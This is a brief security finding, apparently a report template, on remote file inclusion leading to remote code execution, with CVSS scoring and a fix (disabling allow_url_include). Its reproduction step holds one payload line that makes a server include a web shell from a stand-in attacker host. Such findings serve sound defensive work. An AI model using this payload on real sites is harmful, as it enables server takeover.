# File Inclusion - Remote File Inclusion

**Title:** RFI to Execute Remote Code

**Severity:** Critical

**Impact:** High

**Exploitability:** High

**CVSS Base Score:** 9.8

**CVSS v3 Vector:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

**Vulnerability Type:** File Inclusion

**Target:** Remote include param

## Impact

RCE.

## Description

Include remote malicious file.

## Steps to Reproduce

?page=http://attacker/shell.php

## Recommendation

Disable allow_url_include.

## References
OWASP.
